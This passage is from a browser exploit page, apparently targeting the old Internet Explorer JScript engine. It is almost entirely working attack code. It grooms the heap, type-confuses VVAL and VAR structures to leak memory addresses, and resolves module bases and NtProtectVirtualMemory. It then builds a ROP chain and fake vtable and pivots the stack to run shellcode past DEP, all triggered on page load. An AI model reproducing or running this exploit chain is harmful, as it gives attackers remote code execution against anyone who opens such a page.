			reclaimUsingIndex = MICreclaimUsingIndex;
			//reclaimUsingIndex = ORIreclaimUsingIndex;
			CollectGarbage(); //This GC is essential for re-claims with randomized LFH on precise regions (such as VVAL re-claim), but it also allows for the GcBlock re-claim count to be drastically reduced (otherwise 20000+ was needed, as in the original exploit)
		


			// Trigger LFH for a size of 0x648
			for(i = 0; i < 50; i++) {
				Temp = new Object();
				Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
				LFHBlocks.push(Temp);
			}
			
			
			
			setup();			
			for(var i = 0; i < overlay_size; i++) 
			{
				overlay[i][staticPropertyNameforRECLAIM] = 1; //(check the overlay_size)realloc with 300 VVAL or 300 GcBlocks since 1VVAL == 1Gcblock size
				overlay[i]["BBBBBBBBB"] = 1; //18(9*2) bytes for 32bit
				overlay[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
				overlay[i]["C"] = i; // The address of this VVAL will be leaked
			}//done relcaim process 
			//alert("done reclaim with hash thingy");
		
			overlaybackup = overlay;
			//done overlay for VVAL leak
			
			var LeakedVvalAddress = 0;
		
			for(i = 0; i < total.length; i++){
				if(typeof total[i] === "number" && total[i] > 0x1000){
					//alert("done leaking VVAL address...sure we got it!");
					LeakedVvalAddress = total[i];
					break;
				}
			}//done scanning the fake VARs for VVAL address
			

			if( LeakedVvalAddress != 0 ){
				
				variants = "AA"; // 2 wide char == (4 byte) + (the bstr len i,e 4byte) = 8 byte (filling the GcBlock LINKEDLIST POINTER)
				for(i=0; i < 46; i++) {
					variants += CreateVar32(0x80, LeakedVvalAddress, 0);
				}
				while( variants.length < 0x17a) variants += "A";  // padding
				setup();
			
				for(var i = 0; i < overlay_size; i++) 
				{
					overlay[i][variants] = 1;
				}//reclaim with fake VAR with the address of the leaked VVAL (here VVAL == VAR) coz the first member of VVAL is VAR and not *VAR
				//alert("since we got the VVAL address we trying to find the index in overlaybackup");
				
				var LeakedVVALasVAR; // the VAR holding this leaked VVAL (in the overlaybackup)
				for(i = 0; i < total.length; i++){
					if(typeof total[i] === "number"){
						//alert("found our leakedVVAL address as VAL in a fake GcBlock");
						overlaybackupIndex = parseInt((total[i]) + ""); // Reads the target index of overlaybackup[(x)]. Since this is of type 0x80 and not directly 0x3, it cannot be easily read directly, so converting it to a string is a quick solution.
						LeakedVVALasVAR = total[i]; //will be used to verify if reclaimUsingIndex() works?
						break;
					}
				}
				
				reclaimUsingIndex(0x11, "A");			
				if(LeakedVVALasVAR + "" == 0x11) { //since reflect changes from reclaimUsingIndex, we now create a fakeVAR that points the name[] {will be used to create readPRIMITIVE}
					//alert("Objectbackup reclaim using Leaked index -- success");
					
					reclaimUsingIndex(0x11, CreateVar32(0x3, 0x22, 0)); // fill the name[] with a fakeVAR(which is an integer)
					
					variants = "AA";
					for(i=0; i < 46; i++) {
						variants += CreateVar32(0x80, LeakedVvalAddress + 0x30, 0); //0x30 is the offset to name[] in VVAL struct 32bit
					}
					while( variants.length < 0x17a) variants += "A";  // padding
					setup();
					
					for(var i = 0; i < overlay_size; i++){
						overlay[i][variants] = 1; // reclaiming memory by spraying fake VARs actually pointing to the name[](VVAL)
					}
					
					
					for(i = 0; i < total.length; i++){
						if(typeof total[i] === "number" && total[i] + "" == 0x22){
							//alert("found a VAR thats pointing to name[]"); // and that name[] is holding a fake integer VAR 0x22.
							mutableVARinname = total[i];
							break;
						}
					}
					//alert("mutableVARinname:");
					//alert(mutableVARinname + "");
				
					reclaimUsingIndex(0, CreateVar32(0x3, 0x33, 0)); //to verify if we can mutate this mutable VAR in name[]
					
					//alert("mutableVARinname: after mutation");
					//alert(mutableVARinname + "");
					
					if( mutableVARinname + "" == 0x33 ){
						//alert("daymnnnnnn mutable VAR creation and mutation success!");
						if( ReadByte(LeakedVvalAddress + 0x30) == 0x8 ){
							//alert("succ leaking a byte");
							
							var objToLeak = new Object();
							var objectAddress = LeakObjectAddress(LeakedVvalAddress, objToLeak);
							var VtableAddress = ReadDword(objectAddress);
							
							//alert("leaked vtable addr:");
							//alert(VtableAddress.toString(16));
							
							var JScriptBase = FindModuleBase(VtableAddress);
							if(JScriptBase != 0){
								alert("found! jscript base:");
								alert(JScriptBase.toString(16));
								
								
								var Kernel32ImportX = ExtractBaseFromImports(JScriptBase, [0x4e52454b, 0x32334c45]);

								if(Kernel32ImportX != 0) {
									var Kernel32Base = FindModuleBase(Kernel32ImportX);
									if(Kernel32Base != 0) {
										alert("found kernel32base");
										
										var HintIndex = 62;
										var NtProtectAddress = ResolveImport(Kernel32Base, HintIndex, [0x6c64746e, 0x6c642e6c], [0x7250744e, 0x6365746f]); // 'rPtN' 'ceto'
										
										if(NtProtectAddress != 0) {
											alert("Successfully resolved NtProtoectVirtualMemry address from kernel32.dll IAT: ");
											alert(NtProtectAddress.toString(16));
											
											var MsvcrtImportX = ExtractBaseFromImports(JScriptBase, [0x6376736d, 0x642e7472]);
											var MsvcrtBase = FindModuleBase(MsvcrtImportX);
											alert("done leaking msvcrt!");

											var RopGadgetSet = ResolveGadgetSet(MsvcrtBase);
											
											if(RopGadgetSet != null) {
												alert("gadgets avilable");
												
												
												
												var NtProtectProxyStubAddress = ResolveNtProtectProxyStub(NtProtectAddress, 0x100);
                                     

                                        if(NtProtectProxyStubAddress == 0) {
                                            alert("stopppp proxyy shit!");
											return 0;
											}
											alert("proxy worked!");
												
												
												
												
												var ShellcodeStr = TableToUnicode(Shellcode);
												var ShellcodeLen = (ShellcodeStr.length * 2);
												alert("Shellcode length: 0x");
												alert(ShellcodeLen.toString(16));
												ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length); // This trick is essential to ensure the "address of" primitive gets the actual address of the shellcode data and not another VAR in a chain of VARs (this happens when a VAR is appended to another repeaatedly as is the case here)
												var ShellcodeAddress = LeakObjectAddress(LeakedVvalAddress, ShellcodeStr);
												alert("ShellcodeAddress address: ");
												alert(ShellcodeAddress.toString(16));
												
												var WritableStr = "";
												WritableStr += ConvertDwordArrayToBytes([0]);
												WritableStr += ConvertDwordArrayToBytes([ShellcodeAddress]);
												WritableStr += ConvertDwordArrayToBytes([ShellcodeLen]);
												WritableStr += ConvertDwordArrayToBytes([0]);
												WritableStr = WritableStr.substr(0, WritableStr.length);
												var WritableAddress = LeakObjectAddress(LeakedVvalAddress, WritableStr);

												var FakeVtablePaddingSize = 0x10000; // 64KB should be plenty to accomodate stack usage within NtProtectVirtualMemory and within shellcode (if it does not stack pivot on its own)
												alert("bout to call CreateFakeVtable");
												var FakeVtable = CreateFakeVtable(FakeVtablePaddingSize, 0x200, NtProtectProxyStubAddress, ShellcodeAddress, RopGadgetSet, WritableAddress); // Doing this in a separate function is crucial for the AddressOf primitive to work properly. Concatenated vars in the same scope end up as a linked list of VARs
												FakeVtable = FakeVtable.substr(0, FakeVtable.length); // Nice trick to fix the AddressOf primitive. VARs created with multiple concats of other VARs end up as a linked list of VARs
												
												// Re-claim NameList with mutable var set to region AFTER its own VAR in property name (as type 0x81). At this location in property name (+8 because of Type from generated VAR) the "object pointer" of the additional VAR (the fake vtable address) should be pointing at fake vtable BSTR +4 (to skip length
												alert("bout to leak address of fakevtbl ");
												var FakeVtableAddress = (LeakObjectAddress(LeakedVvalAddress, FakeVtable) + FakeVtablePaddingSize);
												
												alert("Fake vtable address: ");
												alert(FakeVtableAddress.toString(16));
												reclaimUsingIndex(0, CreateVar32(0x81, LeakedVvalAddress + 0x30 + 16 + 8, 0) + CreateVar32(0, FakeVtableAddress, 0)); // VAR in VVAL will be a type 0x81 (not type 0x80) VAR. The 0x81 VAR pointer goes to the allocated (Array) object, the first 4 bytes of which are a vtable within jscript.dll
												alert("bbbbbbbbbbbbbbbbbExecuting stack pivot for DEP bypass at ");
												alert(RopGadgetSet.StackPivot.toString(16));
												typeof mutableVARinname;
												alert("Clean return from shellcode");

											}
											
											
											
										}
										
										
										
										
										
										
										
									}
							
								}
								
								
								
								
								
								
								
								
								
								
								
								
							}
							
						}
						
					}
					
					
					
					
				} //if LeakedVVALasVAR check ending
			
			}	
		
		}
//		function main(){
		
		

			
//			leakVVAL();
		
		
	//	}
		
		//main();
		leakVVAL();
			
		
		</script>
	</head>
</html>
